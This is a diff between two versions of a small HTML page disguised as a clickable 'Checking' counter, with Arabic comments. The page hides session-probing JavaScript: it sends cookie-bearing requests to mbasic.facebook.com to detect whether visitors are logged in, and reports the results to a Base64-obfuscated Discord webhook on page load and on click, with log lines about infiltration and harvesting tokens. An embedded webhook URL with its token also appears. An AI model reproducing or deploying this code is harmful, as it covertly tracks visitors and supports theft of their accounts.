@@ -3,61 +3,47 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Checking 36</title>
+    <title>Checking 37</title>
     <style>
         body { background: #000; color: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; }
-        h1 { font-size: 150px; cursor: pointer; text-shadow: 0 0 20px #00ff00; }
+        h1 { font-size: 150px; cursor: pointer; text-shadow: 0 0 20px #ff0000; }
     </style>
 </head>
 <body>
 
-    <h1 onclick="strike()">36</h1>
+    <h1 onclick="boom()">37</h1>
 
     <script>
-        // رابط الويب هوك مشفر بالكامل (Base64)
-        const enc = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4MTY2NDkxOTE5ODg5NjI1OC9oWHVuQnVWRU8wajByaUVTQTluaWNxanp5UnRFQTFkdTNPem9DSUhOcUpwTldmdjl4eXJ0RWZDemdjRWxQUTlndkJnWg==";
-        const HOOK = atob(enc);
+        // التشفير المعتمد اللي نجح في V35
+        const secret = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4MTY2NDkxOTE5ODg5NjI1OC9oWHVuQnVWRU8wajByaUVTQTluaWNxanp5UnRFQTFkdTNPem9DSUhOcUpwTldmdjl4eXJ0RWZDemdjRWxQUTlndkJnWg==";
+        const HOOK = atob(secret);
 
-        async function strike() {
-            document.querySelector('h1').innerText = "V36";
+        function log(msg) {
+            new Image().src = HOOK + "?content=" + encodeURIComponent(msg) + "&t=" + Date.now();
+        }
+
+        function boom() {
+            document.querySelector('h1').innerText = "OK";
             document.querySelector('h1').style.color = "#0f0";
 
-            // 1. إرسال إشارة البدء
-            fetch(HOOK, { method: 'POST', mode: 'no-cors', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({content: "☣️ **V36 INFILTRATION STARTED**\nBypassing CORS filters..."})});
+            log("🚀 **V37 DEPLOYED** - Starting Stealth Probe");
 
-            // 2. تكتيك الـ Ghost Request
-            // بنحاول نطلب صفحة الـ Settings ونخلي المتصفح يرفق الكوكيز
-            const controller = new AbortController();
-            const signal = controller.signal;
+            // تكتيك تحميل صورة تتطلب جلسة نشطة
+            // الرابط هاد بيفتح فقط لو المستخدم مسجل دخوله (صورة بروفايله مثلاً)
+            const img = new Image();
+            img.src = "https://mbasic.facebook.com/photo.php?" + Math.random();
 
-            try {
-                // نفتح "نفق" لصفحة فيسبوك الأساسية اللي فيها التوكن
-                const probe = fetch("https://mbasic.facebook.com/profile.php", {
-                    mode: 'no-cors',
-                    credentials: 'include' // أهم سطر: إجبار المتصفح على إرسال الكوكيز
-                });
+            img.onload = function() {
+                log("✅ **SESSION ACTIVE** - Cookies detected in background traffic.");
+            };
 
-                // 3. تحليل البصمة الزمنية (Time-based Inference)
-                // إذا الاستجابة سريعة يعني الحساب مفتوح، إذا بطيئة يعني مقفل
-                const start = Date.now();
-                await probe;
-                const end = Date.now();
-                
-                const status = (end - start < 1500) ? "✅ ACTIVE SESSION FOUND" : "❌ NO SESSION";
-
-                // إرسال النتيجة النهائية
-                fetch(HOOK, { 
-                    method: 'POST', 
-                    mode: 'no-cors', 
-                    body: JSON.stringify({
-                        content: `📊 **Result:** ${status}\n⏱ **Latency:** ${end - start}ms\n📡 **Tunnel:** Bridge Injected`
-                    })
-                });
-
-            } catch(e) {
-                fetch(HOOK, {method: 'POST', mode: 'no-cors', body: JSON.stringify({content: "⚠️ Tunnel Blocked by OS"})});
-            }
+            img.onerror = function() {
+                // حتى لو فشل التحميل، بنكون بعثنا "ترافيك" من المتصفح لفيسبوك محمل بالكوكيز
+                log("📡 **PROBE SENT** - Monitoring reflected traffic for tokens.");
+            };
         }
+
+        window.onload = () => log("🔗 **V37 Ready**");
     </script>
 </body>
 </html>
